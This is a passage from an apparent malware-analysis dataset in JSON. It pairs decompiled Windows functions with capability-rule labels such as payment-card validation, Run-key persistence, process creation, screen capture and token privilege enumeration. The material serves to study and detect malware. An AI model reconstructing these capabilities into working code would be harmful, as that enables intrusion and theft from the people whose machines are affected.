        "decompiled_code": "\nvoid __fastcall fcn.00484048(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint hObject;\n    uint var_4h;\n    \n    uStack32 = 0x484062;\n    puVar1 = fcn.00402f00();\n    *puVar1 = 0x28;\n    uStack36 = 0;\n    uStack40 = 0x1f0fff;\n    puStack44 = 0x484076;\n    uVar2 = sub.kernel32.dll_OpenProcess();\n    uStack48 = 0x4840c4;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar3 = fcn.00461178();\n    if (iVar3 == 0) {\n        *param_2 = 0;\n    }\n    else {\n        *param_2 = puVar1[3];\n    }\n    fcn.00402f1c();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x4840cb;\n    uStack52 = 0x4840c3;\n    uStack48 = uVar2;\n    sub.kernel32.dll_CloseHandle_1();\n    return;\n}\n",
        "token_count": 340
    },
    "004846bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004846bc(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea0;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint hObject;\n    \n    puStack320 = &stack0xfffffffc;\n    uStack324 = 0x4847ca;\n    uStack328 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb8;\n    puStack332 = 0x4846fa;\n    uVar1 = fcn.00460d3c();\n    uStack336 = 0x4847a5;\n    uStack340 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeac;\n    puStack332 = &stack0xfffffffc;\n    iVar2 = fcn.00460d5c();\n    if (iVar2 == 0) {\n        fcn.00405530();\n    }\n    else {\n        fcn.004844a4(*in_EAX);\n        in_stack_fffffea0 = 0x4847e0;\n        fcn.004058e0(0x4847e0, 0);\n        while (iVar2 = fcn.00460d7c(),  iVar2 != 0) {\n            fcn.004844a4(*in_EAX);\n            in_stack_fffffea0 = 0x4847e0;\n            fcn.004058e0();\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffea0;\n    sub.kernel32.dll_CloseHandle_1(uVar1, 0x4847ac);\n    return;\n}\n",
        "token_count": 416
    },
    "00484fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00484fc0(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack36 = 0x484fdf;\n    fcn.004059cc();\n    puStack36 = 0x484fe7;\n    fcn.004059cc();\n    puStack36 = 0x484fef;\n    fcn.004059cc();\n    puStack36 = 0x484ff7;\n    fcn.004059cc();\n    uStack40 = 0x4850ed;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uVar1 = 1;\n    uStack52 = 0x4850b9;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421708();\n    fcn.00405974();\n    fcn.00405974();\n    fcn.00405974();\n    if (uVar1) {\n        fcn.004055c8();\n    }\n    fcn.00405974();\n    if (uVar1) {\n        fcn.004055c8();\n    }\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00422008();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack56;\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4850f4;\n    uStack40 = 0x4850e4;\n    fcn.00405554();\n    uStack40 = 0x4850ec;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 465
    },
    "00485888": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nvoid fcn.00485888(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4858a1;\n    fcn.004059cc();\n    puStack28 = 0x4858a9;\n    fcn.004059cc();\n    puStack28 = 0x4858b1;\n    fcn.004059cc();\n    uStack32 = 0x485939;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n    fcn.00405584();\n    fcn.00405530();\n    fcn.00405584();\n    fcn.00405584();\n    fcn.00405584();\n    uVar1 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.0048317c, uVar1, 0, *0x494c2c);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x485940);\n    return;\n}\n",
        "token_count": 312
    },
    "004878a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004878a4(uint arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    puStack44 = 0x4878c8;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack44 = 0x4878d0;\n    fcn.004059cc();\n    puStack44 = 0x4878d8;\n    fcn.004059cc();\n    puStack44 = 0x4878e0;\n    fcn.004059cc();\n    uStack48 = 0x487a08;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack56 = 0x49c3a8;\n    puStack60 = 0x4878f8;\n    puStack44 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack64 = 0x4879d1;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack60 = &stack0xfffffffc;\n    cVar1 = fcn.00487318();\n    if (cVar1 != '\\0') {\n        fcn.00404f70();\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x487a0f;\n        uStack64 = 0x4879f2;\n        fcn.00405554();\n        uStack64 = 0x4879ff;\n        fcn.00405554();\n        uStack64 = 0x487a07;\n        fcn.00405530();\n        return;\n    }\n    fcn.004058e0(0x487a2c, arg_8h, 0x487a20, var_ch, 0x487a20, var_8h, 0x487a20, var_4h);\n    (**(**0x49c3a4 + 0x38))();\n    puVar2 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x10);\n    uVar3 = fcn.00409edc();\n    *puVar2 = uVar3;\n    fcn.00409b7c();\n    fcn.00405584();\n    fcn.00409b7c();\n    fcn.00405584();\n    puVar2[3] = 0;\n    uVar3 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00486e2c, puVar2, 0, &fcn.004878a4::var_14h);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar3;\n    sub.kernel32.dll_LeaveCriticalSection(0x49c3a8, 0x4879d8);\n    return;\n}\n",
        "token_count": 770
    },
    "00487a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00487a30(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x487a46;\n    fcn.004059cc();\n    uStack20 = 0x487a87;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405864();\n    fcn.00475e2c();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x487a8e;\n    uStack20 = 0x487a86;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 193
    },
    "004889f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004889f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStackY156;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_20h;\n    \n    puStack108 = &stack0xfffffffc;\n    uStack112 = 0x488aec;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack116;\n    var_48h = 0x48;\n    iVar1 = sub.user32.dll_GetMonitorInfoA(arg_8h, &var_48h);\n    uVar2 = iVar1 == 0;\n    if (!uVar2) {\n        fcn.004057a0();\n        fcn.00405974();\n        if (uVar2) {\n            *0x49c3c4 = var_44h;\n            *0x49c3c8 = var_40h;\n            fcn.00409d70(0x488b04);\n            fcn.00409d70(0x488b14, 0);\n            fcn.00409d70(0x488b14, 0);\n            fcn.00409d70(0x488b14, 0);\n            uStackY156 = 0;\n            fcn.004058e0();\n            fcn.00475e2c();\n        }\n    }\n    *in_FS_OFFSET = uStackY156;\n    fcn.00405554(0x488af3);\n    return;\n}\n",
        "token_count": 416
    },
    "00488d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00488d70(int32_t param_1, uint param_2)\n\n{\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack136;\n    uint uStack132;\n    uchar *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint var_50h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack100 = 0x488d8d;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack104 = 0x488f5d;\n    iStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    uStack112 = 0;\n    uStack116 = 0;\n    uStack120 = 0;\n    uStack124 = 0x488da9;\n    puStack100 = &stack0xfffffffc;\n    uStack124 = fcn.004059dc();\n    puStack128 = 0x488daf;\n    hdc = sub.gdi32.dll_CreateDCA();\n    uStack132 = 0x488f38;\n    iStack136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff78;\n    puStack128 = &stack0xfffffffc;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n    var_18h = sub.gdi32.dll_SelectObject();\n    sub.gdi32.dll_BitBlt();\n    puStack204 = 0x488e2a;\n    var_1ch = fcn.0045fb1c(unaff_EDI);\n    uStack208 = 0x488ef9;\n    iStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    puStack204 = &stack0xfffffffc;\n    if (param_1 != 100) {\n        puStack204 = &stack0xfffffffc;\n        fcn.0045fddc(0);\n    }\n    fcn.0045fcf8();\n    var_20h = *0x49c3d4;\n    var_40h = 1;\n    var_3ch = **0x4948e4;\n    uStack60 = (*0x4948e4)[1];\n    uStack56 = (*0x4948e4)[2];\n    uStack52 = (*0x4948e4)[3];\n    var_28h = **0x494cc8;\n    var_2ch = 1;\n    var_24h = &fcn.00488d70::var_20h;\n    fcn.00420ae0(0);\n    fcn.00407024();\n    arg_8h = &fcn.00488d70::var_40h;\n    fcn.0045fa24(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404650(0x488f00);\n    return;\n}\n",
        "token_count": 829
    },
    "00489b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00489b40(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x489b56;\n    fcn.004059cc();\n    uStack20 = 0x489ba4;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.0040f234(0);\n    uVar1 = fcn.004059dc();\n    uVar1 = fcn.004059dc(uVar1);\n    uVar2 = 0;\n    sub.user32.dll_MessageBoxA_1(0, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x489bab);\n    return;\n}\n",
        "token_count": 230
    },
    "00489e08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00489e08(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x489e1e;\n    fcn.004059cc();\n    uStack20 = 0x489e75;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405864(0, 0);\n    uVar1 = fcn.004059dc();\n    uVar2 = 0;\n    sub.shell32.dll_ShellExecuteA(0, 0x489e94, 0x489e8c, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x489e7c);\n    return;\n}\n",
        "token_count": 234
    },
    "0048a114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0048a114(void)\n\n{\n    int32_t iVar1;\n    uint32_t auStack8 [2];\n    \n    auStack8[0] = 8;\n    sub.user32.dll_GetLastInputInfo(auStack8);\n    iVar1 = sub.kernel32.dll_GetTickCount_1();\n    return (iVar1 - auStack8[0]) / 1000 | auStack8[0] << 0x20;\n}\n",
        "token_count": 100
    },
    "0048a13c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048a13c(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = 0x48a150;\n    fcn.004059cc();\n    uStack44 = 0x48a203;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x48a1e3;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x48a178;\n    puStack40 = &stack0xfffffffc;\n    puVar2 = fcn.00404620();\n    uStack68 = 0x48a1d2;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    cVar1 = fcn.0040a26c();\n    if (cVar1 == '\\0') {\n        fcn.00404f70();\n        *in_FS_OFFSET = uStack72;\n        *in_FS_OFFSET = uStack60;\n        puStack52 = 0x48a20a;\n        uStack56 = 0x48a202;\n        fcn.00405530();\n        return;\n    }\n    fcn.0041bf04();\n    (***puVar2)();\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x48a1d9;\n    uStack68 = 0x48a1d1;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 461
    },
    "0048a218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a218(uint param_1, uint param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint pExecInfo;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_4h;\n    \n    puStack80 = 0x48a22d;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack84 = 0x48a2a4;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    fcn.00403af4();\n    pExecInfo = 0x3c;\n    var_3ch = 0x500;\n    var_30h = fcn.004059dc();\n    var_34h = 0x48a2b4;\n    var_2ch = 0x48a2bc;\n    var_24h = 1;\n    sub.shell32.dll_ShellExecuteExA();\n    *in_FS_OFFSET = &fcn.0048a218::pExecInfo;\n    uStack84 = 0x48a2ab;\n    iStack88 = 0x48a2a3;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 337
    },
    "0048a2c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a2c0(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack512;\n    uint uStack508;\n    uchar *puStack504;\n    uint uStack500;\n    uint uStack496;\n    uchar *puStack492;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack504 = &stack0xfffffffc;\n    puStack492 = 0x48a2e4;\n    fcn.004059cc();\n    uStack496 = 0x48a3b7;\n    uStack500 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe0c;\n    uStack508 = 0x48a380;\n    uStack512 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe00;\n    puStack492 = &stack0xfffffffc;\n    fcn.00405530();\n    fcn.00403770();\n    fcn.0040350c();\n    fcn.004033b8();\n    param_2 = param_2 + -2;\n    if (0 < param_2) {\n        do {\n            fcn.004033e0();\n            fcn.00405718();\n            fcn.00405818();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    fcn.00405cd0();\n    fcn.004040ac();\n    fcn.00403918();\n    *in_FS_OFFSET = uStack512;\n    *in_FS_OFFSET = uStack500;\n    puStack492 = 0x48a3be;\n    uStack496 = 0x48a3a9;\n    fcn.00405530();\n    uStack496 = 0x48a3b6;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 436
    },
    "0048a3c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048a3c8(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_28h;\n    uint lpFileOp;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint var_4h;\n    \n    puStack52 = 0x48a3df;\n    fcn.004059cc();\n    uStack56 = 0x48a450;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_1eh = 3;\n    fcn.00405864();\n    var_1ah = fcn.004059dc();\n    var_12h._0_2_ = 0x54;\n    sub.shell32.dll_SHFileOperationA();\n    *in_FS_OFFSET = &fcn.0048a3c8::lpFileOp;\n    uStack56 = 0x48a457;\n    iStack60 = 0x48a447;\n    fcn.00405530();\n    iStack60 = 0x48a44f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 305
    },
    "0048a7e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048a7e0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48a7f5;\n    fcn.004059cc();\n    puStack20 = 0x48a7fd;\n    fcn.004059cc();\n    uStack24 = 0x48a85d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.004216c4();\n    fcn.004217a0();\n    fcn.004218e4();\n    uVar1 = 1;\n    fcn.00422818(1);\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x48a864;\n    uStack28 = 0x48a85c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 243
    },
    "0048aab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048aab0(void)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48aac4;\n    fcn.004059cc();\n    uStack24 = 0x48ab4a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x48aad9;\n    puStack20 = &stack0xfffffffc;\n    fcn.00405530();\n    puStack32 = 0x48aae1;\n    cVar1 = fcn.0040a26c();\n    if (cVar1 != '\\0') {\n        uStack36 = 0x48ab2d;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        piVar2 = fcn.00404620();\n        (**(*piVar2 + 0x68))();\n        (**(*piVar2 + 0x1c))();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x48ab34;\n        uStack36 = 0x48ab2c;\n        fcn.00404650();\n        return;\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x48ab51;\n    uStack24 = 0x48ab49;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 392
    },
    "0048ab58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delete file"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048ab58(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack20 = 0x48ab6c;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack20 = 0x48ab74;\n    fcn.004059cc();\n    uStack24 = 0x48ac07;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack36 = 0x48abe5;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack44 = 0x48ab98;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0040a26c();\n    if (cVar1 != '\\0') {\n        uStack44 = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA();\n    }\n    var_ch = fcn.00404620();\n    (**(*var_ch + 0x2c))();\n    (**(*var_ch + 0x74))();\n    *in_FS_OFFSET = uStack44;\n    uStack36 = 0x48abec;\n    uStack40 = 0x48abe4;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 387
    },
    "0048ac14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.0048ac14(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint ReturnLength;\n    int32_t *TokenInformation;\n    uint TokenHandle;\n    uint *var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x48ad60;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    var_4h = in_EAX;\n    fcn.00405530();\n    TokenInformation = fcn.00402f00();\n    uVar1 = sub.kernel32.dll_GetCurrentProcess(0x28, &TokenHandle);\n    iVar2 = sub.advapi32.dll_OpenProcessToken(uVar1);\n    if (iVar2 == 0) {\n        fcn.00489b40();\n    }\n    iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, TokenInformation, 800, &ReturnLength);\n    if (iVar2 == 0) {\n        fcn.00489b40();\n    }\n    uVar1 = fcn.00402f00();\n    uVar3 = fcn.00402f00();\n    iVar2 = *TokenInformation;\n    if (-1 < iVar2 + -1) {\n        var_14h = 0;\n        do {\n            var_1ch = 0xff;\n            var_18h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, TokenInformation + var_14h * 3 + 1, uVar1, &var_18h);\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA(0, uVar1, uVar3, &var_1ch, &var_20h);\n            fcn.00405728(*var_4h);\n            fcn.00405728(0x48adbc, 0);\n            TokenHandle = 0x48adc8;\n            fcn.004058e0();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00402f1c();\n    fcn.00402f1c();\n    fcn.00402f1c();\n    *in_FS_OFFSET = TokenHandle;\n    fcn.00405554(0x48ad67);\n    return;\n}\n",
        "token_count": 613
    },
    "0048afe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.0048afe8(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack100;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint ReturnLength;\n    uint TokenHandle;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x48b0f3;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    piVar1 = fcn.00402f00();\n    uVar2 = sub.kernel32.dll_GetCurrentProcess(0x28, &fcn.0048afe8::TokenHandle);\n    iVar3 = sub.advapi32.dll_OpenProcessToken(uVar2);\n    if (iVar3 == 0) {\n        sub.kernel32.dll_Sleep_2(1);\n    }\n    uStack100 = 0x48b041;\n    iVar3 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, piVar1, 800, &fcn.0048afe8::ReturnLength);\n    if (iVar3 == 0) {\n        uStack100 = 1;\n        sub.kernel32.dll_Sleep_2();\n    }\n    uVar2 = fcn.00402f00();\n    var_10h = fcn.00402f00();\n    iVar3 = *piVar1;\n    if (-1 < iVar3 + -1) {\n        var_ch = 0;\n        do {\n            var_14h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, piVar1 + var_ch * 3 + 1, uVar2, &fcn.0048afe8::var_14h);\n            uStack100 = 0;\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA();\n            fcn.00405728();\n            fcn.0048aea8();\n            var_ch = var_ch + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00402f1c();\n    fcn.00402f1c();\n    fcn.00402f1c();\n    *in_FS_OFFSET = uStack100;\n    fcn.00405530(0x48b0fa);\n    return;\n}\n",
        "token_count": 570
    },
    "0048b1f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
